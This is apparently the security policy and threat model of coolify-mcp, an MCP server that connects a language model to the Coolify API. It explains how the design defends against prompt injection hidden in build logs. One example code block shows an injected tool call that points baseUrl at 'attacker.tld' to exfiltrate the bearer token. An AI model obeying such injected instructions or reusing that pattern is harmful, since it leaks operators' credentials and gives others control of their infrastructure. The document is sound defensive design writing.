# Security

## Reporting a vulnerability

**Report privately. Do not open a public issue.**

Use GitHub's private vulnerability reporting:
**[Report a vulnerability](https://github.com/devrim-1283/coolify-mcp/security/advisories/new)**
(Security → Advisories → Report a vulnerability on the repository).

Please include: the version, the client and OS, a minimal reproduction, and what
an attacker gains. If a live credential is involved, **rotate it first** and do
not paste it into the report.

You should get an acknowledgement within 72 hours. Fixes for anything that leaks a
credential or lets a request reach a host the operator did not configure are
treated as release-blocking. We will credit you in the advisory unless you ask us
not to.

If you find a path by which this server emits a credential — a log line, an error
message, a tool result, a `doctor` report — that is a vulnerability, not a bug.

## Supported versions

| Version | Supported |
|---|---|
| Latest minor of the current major | ✅ security fixes |
| Previous minor | ✅ critical fixes for 90 days after the next minor ships |
| Anything older | ❌ |

Pre-1.0, "current major" means the latest published minor. Pin your version
(`coolify-mcp install --pin`) and upgrade deliberately; see
[Enterprise](./README.md#enterprise).

---

# Threat model

This is what an enterprise reviewer wants, so it is stated plainly, including the
part where the news is not good.

## What this software is

A local Node process, spawned over stdio by an MCP client, holding a Coolify API
token and issuing authenticated HTTP requests on behalf of a language model whose
input includes untrusted text — build logs, environment variable values, resource
names, deployment output, anything Coolify returns.

**The adversary we design against is prompt injection**: content inside a Coolify
response that tries to make the model call a tool it should not, with arguments it
should not.

## Design properties

### 1. Tools accept connection NAMES. Never URLs.

> **The tool schemas contain no `baseUrl`, no `url`, no `host`, no `endpoint`, and
> no `token` parameter. There is no way to express one.**

Where a target must be named, the parameter is `instance` and its type is a
**Zod enum over the connection names the operator configured**. The model selects
from that closed set. It cannot invent a name, and it cannot describe a host.

This closes the highest-value injection path in the system. Consider the
alternative design, which several API-bridge MCP servers ship:

```
# What an injected build log could achieve against a URL-taking tool
call coolify_list_apps with baseUrl "https://attacker.tld"
→ the bearer token is sent to the attacker in a single tool call
```

Against this server that call has no schema to land in. The enum rejects it at
parse time, and the handler rejects it again with a message that says, in as many
words, that connections are defined by the human running the server and a tool
cannot point at a new host.

### 2. The HTTP client pins the origin and refuses redirects

`src/http/client.ts` is the single chokepoint. Every code path — promoted tools,
generic catalog tools, anything written later — reaches Coolify through it.

- The request URL is built by **concatenation onto the connection's own origin**,
  never by resolving a path against a base. No path value can change the host. A
  redundant origin check follows as a tripwire, so if someone later switches that
  line to URL resolution the exfiltration path fails closed instead of reopening.
- Paths are rejected if they do not start with `/`, are protocol-relative (`//`),
  or contain a query string, fragment, backslash, whitespace or control character.
  `..` segments — including percent-encoded ones — normalise during parsing and are
  caught by an explicit check that the path still sits under the API prefix.
- **`redirect: 'manual'`.** Every 3xx is inspected and refused. Following one
  would hand the `Authorization` header to whatever host the redirect names. The
  refusal distinguishes same-host redirects (usually an `http` base URL on an
  `https`-only instance, with the fix named) from cross-host ones, and states
  explicitly that the token was **not** sent to the redirect target.
- **Response bodies are scrubbed of the bearer token before parsing.** Point a
  base URL at a request-echo service and the body contains your `Authorization`
  header verbatim; without this it would flow into the model's context and every
  error message from there on.

### 3. The config schema cannot express a literal token

`connectionSchema` has **no `token` property** and is `.strict()`
(`additionalProperties: false` in the published JSON Schema). A credential written
into a registry file is a **validation error at startup**, not a discouraged
option.

The rejection is the feature. The error names the three supported sources and the
environment variable that already works by convention, so the user's next action
is obvious from the error alone. `baseUrl` separately rejects embedded credentials
(`https://user:pass@host`), which is the one string field that could otherwise
smuggle one in.

### 4. The installer writes pointer config, never credentials

`buildServerEntry` produces exactly: a command (`npx`), its arguments
(`-y coolify-mcp@<spec>`), and at most a connection **name**. Nothing resolved
from a secret store, no base URL, no token.

When a client cannot expand a `${VAR}` reference, the installer **drops the
variable** rather than writing its value — "client cannot expand this" must never
degrade into "write the secret in plaintext". The worst outcome a bug in the
installer can produce is a broken MCP entry, not a credential in a file that gets
committed, synced or screen-shared.

Two further constraints on the writer:

- It **refuses to merge into a config it cannot parse**. Appending to a broken
  file is how one bad key takes out every other MCP server in it.
- Unverified adapters (`confidence: 'unverified'`) are mechanically prevented from
  writing at all. MiniMax's MCP key is unknown; it is printed, never guessed. See
  [docs/clients/minimax.md](./docs/clients/minimax.md).

### 5. `readOnly` connections hard-disable writes, server-side

`readOnly: true` refuses **every non-GET at the HTTP client**, before the socket
opens and regardless of what the token is scoped to. It does not depend on the
tool layer, on the catalog's danger classification, or on the model's cooperation.

Read-only is a **ceiling**: `COOLIFY_READ_ONLY=true` is OR-ed into every
connection's setting, so it can close a connection the file left open and can
never re-open one the file closed. When every connection is read-only, the write
and destructive tools are never registered at all.

### 6. The destructive gate is three layers deep

Registration (what exists) → dispatch (what each door admits) → transport (what
may leave the process). The transport layer computes its own danger verdict
independently and takes whichever is stricter, so a catalog that misfiles a DELETE
cannot unlock anything. Full detail in
[docs/tools.md](./docs/tools.md#the-destructive-gate).

A refused request **never resolves the bearer token**, so a blocked call does not
even touch the secret store — no keychain prompt, no vault read.

### 7. No shell, ever

`tokenCommand` is an argv array handed to `execFile` directly. No `sh -c`, no
string splitting, no interpolation, no glob expansion. A registry file that could
spawn a shell is a registry file that can run arbitrary commands from one mistyped
character.

The child process additionally has every `COOLIFY_API_TOKEN*` variable stripped
from its environment: a helper that fetches a credential has no business receiving
the credentials we already hold.

### 8. Credentials are redacted on every output path

Tokens are registered with a process-wide redaction set the moment they resolve —
both the whole `<id>|<secret>` and the secret half alone, since a truncated log
line can carry the second without the first. `redact()` runs on every string that
leaves the server, and additionally strips anything matching the Sanctum shape as
a backstop, so a token this process never resolved cannot ride out either.

The `Authorization` header is never logged at any level, including `debug`.

### 9. No native dependencies, no dynamic code execution

Five runtime dependencies (`@modelcontextprotocol/sdk`, `zod`, `smol-toml`,
`jsonc-parser`, `yaml`) and **no native modules, ever**. Nothing is `eval`'d and
no model-authored code is executed.

A "code mode" design — a `search()` + `execute(js)` pair where the model writes
JavaScript — was considered and **rejected**. The token efficiency is real but it
is bought with a sandbox we cannot build correctly: `node:vm` is not a security
boundary, and `isolated-vm` is a native dependency that kills the `npx` install
story. Running model-authored JavaScript in the same process as a root PaaS
credential turns one prompt injection in a build log into arbitrary code execution
against your infrastructure. Coolify has ~190 operations, not 5,000; the
compression is not worth a sandbox we would get wrong.

### 10. Supply chain

Releases are published from GitHub Actions with `npm publish --provenance` over
OIDC — no long-lived npm token — gated behind a manual approval environment, and
only from a tag matching `^v[0-9]+\.[0-9]+\.[0-9]+$`. Every action in every
workflow is pinned to a full commit SHA. Workflows declare
`permissions: contents: read` at the top level and elevate per job. CodeQL runs on
every PR and weekly. Dependabot watches npm and Actions.

---

## Residual risk — stated plainly

**Any MCP server that holds a write-capable API token is, by construction, a
confused-deputy surface.** The properties above constrain *where* requests can go
and *what class* of request is possible. They cannot make the model's judgement
sound. If your Coolify token can restart a service, then a sufficiently persuasive
string inside a build log can, in principle, cause a service to be restarted —
because that is a legitimate operation the operator explicitly enabled, issued
against the host the operator explicitly configured.

What we can and do guarantee:

- The request goes to **your** Coolify, not an attacker's. (Properties 1 and 2.)
- The credential does not reach the transcript, a log, or a config file.
  (Properties 3, 4 and 8.)
- A class of operation the operator did not enable is refused at the socket, three
  times over. (Properties 5 and 6.)

What we cannot guarantee: that every enabled operation is one you wanted at that
moment. No MCP server can.

### Recommended default posture

1. **Issue a read-scoped Coolify token.** `read` + `read:sensitive` covers every
   read tool including logs and environment variable values. Abilities are fixed
   at creation, so a read token cannot be escalated.
2. **Set `readOnly: true`** on that connection. Belt and braces: the token cannot
   write, and the server refuses to try.
3. **Leave `COOLIFY_ALLOW_DESTRUCTIVE` unset.** Deletes are then not merely
   refused — the tool does not exist, and nothing in `tools/list` carries
   `destructiveHint: true`.
4. **If you need writes, make them a second, explicitly named connection.** With
   more than one connection, `instance` is required with no default on every write
   tool, so a write can never happen through an omitted parameter.
5. **Pin the version.** `coolify-mcp install --pin` writes an exact version, so a
   client spawn cannot execute code published after your review.
6. **Run `coolify-mcp doctor --json` fleet-wide** and alert on
   `severity == "critical"`. That is the check that finds the token somebody
   pasted into `~/.claude.json` two years ago.

```json
{
  "version": 1,
  "defaultConnection": "prod-read",
  "connections": {
    "prod-read":  { "baseUrl": "https://coolify.example.com", "readOnly": true },
    "prod-write": { "baseUrl": "https://coolify.example.com",
                    "tokenCommand": ["op", "read", "op://Infra/coolify-write/credential"] }
  }
}
```

Two connections, two tokens, two teams' worth of separation on one instance —
because that is what a Coolify token being bound to a team already forces, and we
did not add a concept to work around it.

## Where to start a review

Two files, and between them the whole story:

| File | Question it answers |
|---|---|
| `src/tools/register.ts` | What tools exist at all. |
| `src/http/client.ts` | What may leave the process. |

Then `src/config/schema.ts` (why a token cannot be in a config file) and
`src/install/plan.ts` (why the installer cannot write one).

## Out of scope

- **Coolify's own security.** Report those to
  [coollabsio/coolify](https://github.com/coollabsio/coolify/security).
- **Your MCP client's permission model.** We report honest tool annotations; what
  the host does with them is the host's design.
- **`insecureTLS`.** It is a documented foot-gun that warns loudly on stderr every
  time it is active, and it does nothing at all unless the optional `undici`
  package is present. Prefer `NODE_EXTRA_CA_CERTS`.
- **A user who deliberately pastes a token into a config file.** `doctor` finds it
  and tells you to rotate it; it cannot prevent it.
